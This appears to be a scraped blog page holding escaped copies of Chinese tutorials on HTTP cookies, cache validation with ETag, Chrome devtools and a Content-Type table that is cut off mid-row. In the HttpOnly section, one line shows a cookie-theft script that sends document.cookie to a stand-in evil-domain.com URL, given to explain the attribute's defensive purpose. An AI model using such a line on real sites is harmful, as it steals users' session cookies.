&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628169793793.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;生成&#34;&gt;生成&lt;/h2&gt;
&lt;p&gt;服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个&lt;code&gt;Set-Cookie&lt;/code&gt;字段。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Set-Cookie:foo=bar
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码会在浏览器保存一个名为&lt;code&gt;foo&lt;/code&gt;的 Cookie，它的值为&lt;code&gt;bar&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;HTTP 回应可以包含多个&lt;code&gt;Set-Cookie&lt;/code&gt;字段，即在浏览器生成多个 Cookie。下面是一个例子。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;除了 Cookie 的值，&lt;code&gt;Set-Cookie&lt;/code&gt;字段还可以附加 Cookie 的属性。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Set-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;; Expires=&amp;lt;date&amp;gt;
Set-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;; Max-Age=&amp;lt;non-zero-digit&amp;gt;
Set-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;; Domain=&amp;lt;domain-value&amp;gt;
Set-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;; Path=&amp;lt;path-value&amp;gt;
Set-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;; Secure
Set-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;; HttpOnly
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的几个属性的含义，将在后文解释。&lt;/p&gt;
&lt;p&gt;一个&lt;code&gt;Set-Cookie&lt;/code&gt;字段里面，可以同时包括多个属性，没有次序的要求。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Set-Cookie: &amp;lt;cookie-name&amp;gt;=&amp;lt;cookie-value&amp;gt;; Domain=&amp;lt;domain-value&amp;gt;; Secure; HttpOnly
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;下面是一个例子。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的&lt;code&gt;key&lt;/code&gt;、&lt;code&gt;domain&lt;/code&gt;、&lt;code&gt;path&lt;/code&gt;和&lt;code&gt;secure&lt;/code&gt;都匹配。举例来说，如果原始的 Cookie 是用如下的&lt;code&gt;Set-Cookie&lt;/code&gt;设置的。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Set-Cookie: key1=value1; domain=example.com; path=/blog
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;改变上面这个 Cookie 的值，就必须使用同样的&lt;code&gt;Set-Cookie&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Set-Cookie: key1=value2; domain=example.com; path=/blog
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Set-Cookie: key1=value2; domain=example.com; path=/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的命令设置了一个全新的同名 Cookie，但是&lt;code&gt;path&lt;/code&gt;属性不一样。下一次访问&lt;code&gt;example.com/blog&lt;/code&gt;的时候，浏览器将向服务器发送两个同名的 Cookie。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Cookie: key1=value1; key1=value2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。&lt;/p&gt;
&lt;h3 id=&#34;demo-nodejs&#34;&gt;demo-node.js&lt;/h3&gt;
&lt;p&gt;服务端返回数据的时候，通过 &lt;strong&gt;Set-Cookie&lt;/strong&gt; ，保存到浏览器中。&lt;/p&gt;
&lt;p&gt;test.html&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
  &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
  &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
  &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;ie=edge&amp;quot;&amp;gt;
  &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
  &amp;lt;div&amp;gt;Content&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;script&amp;gt;
  console.log(document.cookie)
&amp;lt;/script&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;server.js&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const http = require(&#39;http&#39;)
const fs = require(&#39;fs&#39;)

http.createServer(function (request, response) {
  console.log(&#39;request come&#39;, request.url)

  if (request.url === &#39;/&#39;) {
    const html = fs.readFileSync(&#39;test.html&#39;, &#39;utf8&#39;)
    response.writeHead(200, {
      &#39;Content-Type&#39;: &#39;text/html&#39;,
      &#39;Set-Cookie&#39;: [&#39;id=123; max-age=2&#39;, &#39;abc=456;domain=test.com&#39;]
    })
    response.end(html)
  }

}).listen(8888)

console.log(&#39;server listening on 8888&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;发送&#34;&gt;发送&lt;/h2&gt;
&lt;p&gt;浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的&lt;code&gt;Cookie&lt;/code&gt;字段。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Cookie: foo=bar
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码会向服务器发送名为&lt;code&gt;foo&lt;/code&gt;的 Cookie，值为&lt;code&gt;bar&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Cookie&lt;/code&gt;字段可以包含多个 Cookie，使用分号（&lt;code&gt;;&lt;/code&gt;）分隔。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Cookie: name=value; name2=value2; name3=value3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;下面是一个例子。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cookie 的各种属性，比如何时过期。&lt;/li&gt;
&lt;li&gt;哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;属性&#34;&gt;属性&lt;/h2&gt;
&lt;h3 id=&#34;expiresmax-age&#34;&gt;Expires，Max-Age&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Expires&lt;/code&gt;属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用&lt;code&gt;Date.prototype.toUTCString()&lt;/code&gt;进行格式转换。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果不设置该属性，或者设为&lt;code&gt;null&lt;/code&gt;，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Max-Age&lt;/code&gt;属性指定从现在开始 Cookie 存在的秒数，比如&lt;code&gt;60 * 60 * 24 * 365&lt;/code&gt;（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。&lt;/p&gt;
&lt;p&gt;如果同时指定了&lt;code&gt;Expires&lt;/code&gt;和&lt;code&gt;Max-Age&lt;/code&gt;，那么&lt;code&gt;Max-Age&lt;/code&gt;的值将优先生效。&lt;/p&gt;
&lt;p&gt;如果&lt;code&gt;Set-Cookie&lt;/code&gt;字段没有指定&lt;code&gt;Expires&lt;/code&gt;或&lt;code&gt;Max-Age&lt;/code&gt;属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。&lt;/p&gt;
&lt;h3 id=&#34;domainpath&#34;&gt;Domain，Path&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Domain&lt;/code&gt;属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前 URL 的一级域名，比如&lt;code&gt;www.example.com&lt;/code&gt;会设为&lt;code&gt;example.com&lt;/code&gt;，而且以后如果访问&lt;code&gt;example.com&lt;/code&gt;的任何子域名，HTTP 请求也会带上这个 Cookie。如果服务器在&lt;code&gt;Set-Cookie&lt;/code&gt;字段指定的域名，不属于当前域名，浏览器会拒绝这个 Cookie。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Path&lt;/code&gt;属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，&lt;code&gt;Path&lt;/code&gt;属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，&lt;code&gt;PATH&lt;/code&gt;属性是&lt;code&gt;/&lt;/code&gt;，那么请求&lt;code&gt;/docs&lt;/code&gt;路径也会包含该 Cookie。当然，前提是域名必须一致。&lt;/p&gt;
&lt;h3 id=&#34;securehttponly&#34;&gt;Secure，HttpOnly&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Secure&lt;/code&gt;属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的&lt;code&gt;Secure&lt;/code&gt;属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HttpOnly&lt;/code&gt;属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是&lt;code&gt;Document.cookie&lt;/code&gt;属性、&lt;code&gt;XMLHttpRequest&lt;/code&gt;对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;(new Image()).src = &amp;quot;http://www.evil-domain.com/steal-cookie.php?cookie=&amp;quot; + document.cookie;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的&lt;code&gt;HttpOnly&lt;/code&gt;属性，上面代码就不会读到该 Cookie。&lt;/p&gt;
&lt;h2 id=&#34;documentcookie&#34;&gt;document.cookie&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;document.cookie&lt;/code&gt;属性用于读写当前网页的 Cookie。&lt;/p&gt;
&lt;p&gt;读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有&lt;code&gt;HTTPOnly&lt;/code&gt;属性。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;document.cookie // &amp;quot;foo=bar;baz=bar&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码从&lt;code&gt;document.cookie&lt;/code&gt;一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var cookies = document.cookie.split(&#39;;&#39;);

for (var i = 0; i &amp;lt; cookies.length; i++) {
  console.log(cookies[i]);
}
// foo=bar
// baz=bar
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;document.cookie&lt;/code&gt;属性是可写的，可以通过它为当前网站添加 Cookie。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;document.cookie = &#39;fontSize=14&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;写入的时候，Cookie 的值必须写成&lt;code&gt;key=value&lt;/code&gt;的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用&lt;code&gt;encodeURIComponent&lt;/code&gt;方法达到。&lt;/p&gt;
&lt;p&gt;但是，&lt;code&gt;document.cookie&lt;/code&gt;一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;document.cookie = &#39;test1=hello&#39;;
document.cookie = &#39;test2=world&#39;;
document.cookie
// test1=hello;test2=world
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;document.cookie&lt;/code&gt;读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，&lt;code&gt;Cookie&lt;/code&gt;字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，&lt;code&gt;Set-Cookie&lt;/code&gt;字段是一行设置一个 Cookie。&lt;/p&gt;
&lt;p&gt;写入 Cookie 的时候，可以一起写入 Cookie 的属性。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;document.cookie = &amp;quot;foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码中，写入 Cookie 的时候，同时设置了&lt;code&gt;expires&lt;/code&gt;属性。属性值的等号两边，也是不能有空格的。&lt;/p&gt;
&lt;p&gt;各个属性的写入注意点如下。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;path&lt;/code&gt;属性必须为绝对路径，默认为当前路径。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;domain&lt;/code&gt;属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是&lt;code&gt;example.com&lt;/code&gt;，就不能将其设为&lt;code&gt;foo.com&lt;/code&gt;。该属性默认为当前的一级域名（不含二级域名）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;max-age&lt;/code&gt;属性的值为秒数。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;expires&lt;/code&gt;属性的值为 UTC 格式，可以使用&lt;code&gt;Date.prototype.toUTCString()&lt;/code&gt;进行日期格式转换。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;document.cookie&lt;/code&gt;写入 Cookie 的例子如下。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;document.cookie = &#39;fontSize=14; &#39;
  + &#39;expires=&#39; + someDate.toGMTString() + &#39;; &#39;
  + &#39;path=/subdirectory; &#39;
  + &#39;domain=*.example.com&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。&lt;/p&gt;
&lt;p&gt;删除一个现存 Cookie 的唯一方法，是设置它的&lt;code&gt;expires&lt;/code&gt;属性为一个过去的日期。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;document.cookie = &#39;fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码中，名为&lt;code&gt;fontSize&lt;/code&gt;的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。&lt;/p&gt;
&lt;h2 id=&#34;特点&#34;&gt;特点&lt;/h2&gt;
&lt;h3 id=&#34;不可跨域&#34;&gt;不可跨域&lt;/h3&gt;
&lt;p&gt;每个 cookie 都会绑定单一的域名，无法在别的域名下获取使用&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一级域名和二级域名之间是允许共享使用的&lt;/strong&gt;（&lt;strong&gt;靠的是 domain）&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&#34;转载&#34;&gt;转载&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;阮一峰&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://javascript.ruanyifeng.com/bom/cookie.html&#34;&gt;https://javascript.ruanyifeng.com/bom/cookie.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies&#34;&gt;MDN/HTTP/Cookies&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://juejin.cn/post/6898630134530752520&#34;&gt;前端鉴权的兄弟们：cookie、session、token、jwt、单点登录&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://juejin.cn/post/6844904034181070861&#34;&gt;傻傻分不清之 Cookie、Session、Token、JWT&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://juejin.cn/post/6844903812092674061&#34;&gt;深入了解浏览器存储--从cookie到WebStorage、IndexedDB&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://juejin.cn/post/6914109129267740686&#34;&gt;面试不再怕：史上最全的cookie知识点详解&lt;/a&gt;&lt;/p&gt;
">75-http-25-cookie</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-huan-cun-yan-zheng/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;当我们给Catch-Control 设置了 no-catch 后，每次浏览器对这个资源的请求时，都会到服务器端进行资源验证，验证完之后，如果确定这个资源可以使用缓存，浏览器才会读取本地的缓存。&lt;/p&gt;
&lt;h2 id=&#34;缓存验证流程&#34;&gt;缓存验证流程&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1627000310327.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;方式&#34;&gt;方式&lt;/h2&gt;
&lt;p&gt;验证资源是否需要更新有两种方式： Last-Modified 与 Etag&lt;/p&gt;
&lt;h3 id=&#34;last-modified&#34;&gt;Last-Modified&lt;/h3&gt;
&lt;p&gt;上次修改时间。主要配合If-Modified-Since 或者 If-Unmodified-Since 这两个Header 使用。&lt;/p&gt;
&lt;p&gt;通过对比请求首部字段If-Modified-Since和实体首部字段 Last-Modified，来判断是否使用缓存。&lt;/p&gt;
&lt;p&gt;如果我们请求的一个资源，它返回的Header 中有Last-Modified 并指定了一个时间。那么下次浏览器再发送这个请求的时候就会带上这个时间，并把它放在 If-Modified-Since中；服务器就可以根据If-Modified-Since值对比资源上次修改的时间，如果两个时间一致，说明请求的资源都没有过更新，那么就可以使用缓存&lt;/p&gt;
&lt;h3 id=&#34;etag&#34;&gt;Etag&lt;/h3&gt;
&lt;p&gt;是一个更为严格的验证，通过数据签名的方式验证。主要配合 If-Match 或者 If-None-Match 使用。&lt;/p&gt;
&lt;p&gt;它根据数据内容产生一个唯一的编码（数据不同，编码结果不同）。最典型的做法，是我们对数据内容做一个哈希计算。&lt;/p&gt;
&lt;p&gt;当服务端加上&lt;code&gt;Last-Modified&lt;/code&gt;,&lt;code&gt;Etag&lt;/code&gt;，浏览器下次请求就会带上&lt;code&gt;If-Modified-Since&lt;/code&gt;和&lt;code&gt;If-None-Match&lt;/code&gt;,来进行缓存验证。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用缓存实例&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;test.html&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
  &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
  &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1.0&amp;quot;&amp;gt;
  &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;ie=edge&amp;quot;&amp;gt;
  &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    
&amp;lt;/body&amp;gt;
&amp;lt;script src=&amp;quot;/script.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;server.js&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const http = require(&#39;http&#39;)
const fs = require(&#39;fs&#39;)

http.createServer(function (request, response) {
  console.log(&#39;request come&#39;, request.url)

  if (request.url === &#39;/&#39;) {
    const html = fs.readFileSync(&#39;test.html&#39;, &#39;utf8&#39;)
    response.writeHead(200, {
      &#39;Content-Type&#39;: &#39;text/html&#39;
    })
    response.end(html)
  }

  if (request.url === &#39;/script.js&#39;) {
    
    const etag = request.headers[&#39;if-none-match&#39;]
    if (etag === &#39;777&#39;) {
      response.writeHead(304, {
        &#39;Content-Type&#39;: &#39;text/javascript&#39;,
        &#39;Cache-Control&#39;: &#39;max-age=2000000, no-cache&#39;,
        &#39;Last-Modified&#39;: &#39;123&#39;,
        &#39;Etag&#39;: &#39;777&#39;
      })
      response.end()
    } else {
      response.writeHead(200, {
        &#39;Content-Type&#39;: &#39;text/javascript&#39;,
        &#39;Cache-Control&#39;: &#39;max-age=2000000, no-cache&#39;,
        &#39;Last-Modified&#39;: &#39;123&#39;,
        &#39;Etag&#39;: &#39;777&#39;
      })
      response.end(&#39;console.log(&amp;quot;script loaded twice&amp;quot;)&#39;)
    }
  }
}).listen(8888)

console.log(&#39;server listening on 8888&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;node server.js&lt;/code&gt;启动，在&lt;code&gt;http://localhost:8888/&lt;/code&gt;上查看server.js的网络请求。&lt;/p&gt;
&lt;p&gt;可以发现，状态码第一次是200，第二次及以后缓存范围期限内，都是304&lt;/p&gt;
">74-http-24-缓存验证</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/chrome-kai-fa-zhe-gong-ju/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;开发调试工具&lt;/p&gt;
&lt;h2 id=&#34;功能&#34;&gt;功能&lt;/h2&gt;
&lt;h3 id=&#34;network&#34;&gt;Network&lt;/h3&gt;
&lt;p&gt;1、Disable cache&lt;/p&gt;
&lt;p&gt;当勾选了Disable cache，浏览器发送http请求就不会再发送缓存相关的请求头，比如If-Modified-Since、If-None-Match等，即不再使用缓存。&lt;/p&gt;
&lt;p&gt;2、connectionId&lt;/p&gt;
&lt;p&gt;在name状态栏那一行右击，可以勾选要显示和隐藏的列，选择显示connectionId&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;connectionId&lt;/code&gt; is the unique identifier of the connection used for that query/TCP connection etc. It&#39;s a way of evaluating which resources are using which connection.&lt;/p&gt;
&lt;p&gt;connectionId是用于该查询/TCP连接等的连接的唯一标识符。它是一种评估哪些资源正在使用哪个连接的方法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;For example:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Name      Connection ID    (TCP Handshake / Reused Connection)
foo.jpg   72218            Handshake
bar.jpg   72218            Reused
cat.jpg   79146            Handshake
baz.jpg   72218            Reused
dog.jpg   79146            Reused
&lt;/code&gt;&lt;/pre&gt;
">73-chrome-2-开发者工具</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-shi-ti-shou-bu-zi-duan-content-type/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件，这就是经常看到一些 PHP 网页点击的结果却是下载一个文件或一张图片的原因。&lt;/p&gt;
&lt;p&gt;Content-Type 标头告诉客户端实际返回的内容的内容类型。&lt;/p&gt;
&lt;p&gt;语法格式：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;Content-Type: text/html; charset=utf-8
Content-Type: multipart/form-data; boundary=something
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;常见媒体类型&#34;&gt;常见媒体类型&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;text/html ： HTML格式&lt;/li&gt;
&lt;li&gt;text/plain ：纯文本格式&lt;/li&gt;
&lt;li&gt;text/xml ： XML格式&lt;/li&gt;
&lt;li&gt;image/gif ：gif图片格式&lt;/li&gt;
&lt;li&gt;image/jpeg ：jpg图片格式&lt;/li&gt;
&lt;li&gt;image/png：png图片格式&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以application开头的媒体格式类型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;application/xhtml+xml ：XHTML格式&lt;/li&gt;
&lt;li&gt;application/xml： XML数据格式&lt;/li&gt;
&lt;li&gt;application/atom+xml ：Atom XML聚合格式&lt;/li&gt;
&lt;li&gt;application/json： JSON数据格式&lt;/li&gt;
&lt;li&gt;application/pdf：pdf格式&lt;/li&gt;
&lt;li&gt;application/msword ： Word文档格式&lt;/li&gt;
&lt;li&gt;application/octet-stream ： 二进制流数据（如常见的文件下载）&lt;/li&gt;
&lt;li&gt;application/x-www-form-urlencoded ： &lt;code&gt;&amp;lt;form encType=&amp;quot;&amp;quot;&amp;gt;&lt;/code&gt;中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另外一种常见的媒体格式是上传文件之时使用的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;http-content-type-对照表&#34;&gt;HTTP content-type 对照表&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;文件扩展名&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;Content-Type(Mime-Type)&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;文件扩展名&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;Content-Type(Mime-Type)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.*（ 二进制流，不知道下载文件类型）&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/octet-stream&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.tif&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;image/tiff&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.001&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-001&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.301&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-301&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.323&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;text/h323&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.906&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;application/x-906&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;.907&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;drawing/907&lt;/td&gt;
